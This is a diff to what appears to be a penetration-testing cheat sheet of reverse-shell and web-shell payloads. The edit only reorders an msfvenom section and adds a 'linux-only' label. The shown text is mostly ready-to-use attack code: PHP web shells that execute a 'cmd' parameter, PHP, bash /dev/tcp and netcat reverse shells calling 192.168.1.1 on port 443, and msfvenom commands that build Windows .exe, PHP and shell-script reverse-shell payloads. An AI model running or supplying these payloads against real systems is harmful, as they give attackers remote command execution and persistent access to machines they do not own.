@@ -18,7 +18,7 @@ PHP code for a simple web shell:
 <?php echo shell_exec($_GET['cmd']); ?>
 <?php $cmd=$_GET['cmd']; system($cmd);?>
 
-PHP to immediately pop a shell
+PHP to immediately pop a shell (linux-only)
 <?php $sock=fsockopen("192.168.1.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'");?>
 ```
@@ -30,7 +30,6 @@ Bash
 
 Netcat
 > nc -e /bin/bash 192.168.1.1 443
-
 ```
 
 ###### Ready-to-go reverse shell payloads
@@ -64,6 +63,12 @@ Staged payload
 > msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
 ```
 
+
+###### .exe reverse shell
+```
+> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
+```
+
 ###### PHP reverse shell
 ```
 > msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
@@ -82,11 +87,6 @@ x64
 ###### .sh reverse shell
 ```
 > msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=443 -f raw > shell.sh
-```
-
-###### .exe reverse shell
-```
-> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
 ```
 
 ###### Some more reverse shells
